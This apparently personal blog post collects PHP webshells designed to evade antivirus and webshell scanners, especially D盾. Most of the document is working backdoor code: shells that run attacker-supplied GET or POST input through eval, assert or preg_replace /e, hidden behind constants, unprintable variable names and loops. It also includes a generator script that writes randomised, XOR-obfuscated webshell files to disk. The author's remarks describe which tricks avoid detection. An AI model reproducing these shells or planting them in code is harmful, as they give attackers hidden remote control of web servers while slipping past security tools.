---
title: "PHP Webshell Bypass"
date: 2019-08-12T21:10:02+08:00
draft: false
tags: ['bypass']
categories: ['bypass']
---

准备写一个长期更新的免杀webshell总结

<!--more-->

2019-10-12

一个符号bypass

https://forum.90sec.com/t/topic/513/1

```php
<?php
function test($name){#
    eval($name);
}

test($_GET['code']);
?>
```



2019-08-15

https://evi1.cn/post/bypass-shell/

```php
<?php
$a = $_POST['cmd'];
$var = "phpnb {${eval($a)}}";
```

2019-08-12

![20190812215816](https://y4er.com/img/uploads/20190812215816.png)

2019-08-09

疯狂免杀

![20190809144327](https://y4er.com/img/uploads/20190809144327.png)

2019-08-07

```php
<?php
function a()
{
    return '' + @$_POST['a'];
}

eval(a());
```

再来一个三元表达式的

![20190807111622](https://y4er.com/img/uploads/20190807111622.png)

2019-08-06

常量过D盾

https://secquan.org/Notes/1069997

```php
<?php
sprintf("123");
sprintf("123");
sprintf("123");
$a=$_GET['a'];
define("Test", "$a",true);
assert(TesT);
?>
```



另一种思路反序列化过D盾，代码自己写

再一种思路 创建对象重复定义变量成员过D盾

2019-05-30

ASCII码显示不出来的字符做变量过D盾

<https://github.com/th1k404/unishell>

<http://ascii.911cha.com/>

```php
<?php
if($_GET['␄']){
    $␄=$_GET['␄'];
    @preg_replace("/abcde/e",$␄, "abcdefg");
}
?>
```

可以自己修改

2019-05-21

<https://github.com/yzddmr6/webshell-venom>

利用随机异或无限免杀d盾

蚁剑插件版请移步:

<https://github.com/yzddmr6/as_webshell_venom>

```php
<?php
//code by Mr6
error_reporting(0);
	function randomkeys($length)   
{   
   $pattern = '`~-=!@#$%^&*_/+?<>{}|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';  
    for($i=0;$i<$length;$i++)   
    {   
        $key[$i]= $pattern{mt_rand(0,strlen($pattern)-1)};    //生成php随机数   
    }   
    return $key;   
}   
	function randname($length)   
{   
   $pattern = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';  
    for($i=0;$i<$length;$i++)   
    {   
        @$key.= $pattern{mt_rand(0,strlen($pattern)-1)};    //生成php随机数   
    }   
    return $key;   
} 
	$str=randomkeys(6); 
	$bname=randname(4);
	$lname=strrev(strtolower($bname));
	$str2="assert";
			echo "<?php \n";
			echo "header('HTTP/1.1 404');\n";
			echo "class  ".$bname."{ public \$c='';\nfunction __destruct(){\n";
	for ($i=0;$i<6;$i++)
	{
		$name="_".$i;
		$str3[$i]=bin2hex($str[$i] ^$str2[$i]);
		echo "$"."$name=";
	echo "'".$str[$i]."'"."^"."\"\\x".$str3[$i]."\";\n";
	}
	$aa='$db=$_0.$_1.$_2.$_3.$_4.$_5;';
	echo $aa;
	echo "\n";
	echo '@$db ("$this->c");}}';
	echo "\n";
	echo "\${$lname}=new {$bname}();\n";
	echo "@\${$lname}->c=\$_POST['Mr6'];\n";
	echo "?>\n";
	@$file=$_GET['file'];
	$html = ob_get_contents();
	if (isset($file)){
	if(file_put_contents($file,$html))
	echo "\n\n\n".$file."   save success!";}
	else {echo "Please input the file name like '?file=xxx.txt'";}
	?>
```



2019-05-11

```php
<?php
function a(){
	return $a=$_POST['1'];
}
@assert(a());
?>
```

![](https://y4er.com/img/uploads/20190511171755.png)

```php
<?php
$value=$key = "a";
foreach($_POST as $key=>$value){
	assert($value);
}
```
![](https://y4er.com/img/uploads/20190511183608.png)
**可以发现的规律是当已经定义的变量和循环的变量名一致时，D盾就不是那么敏感了**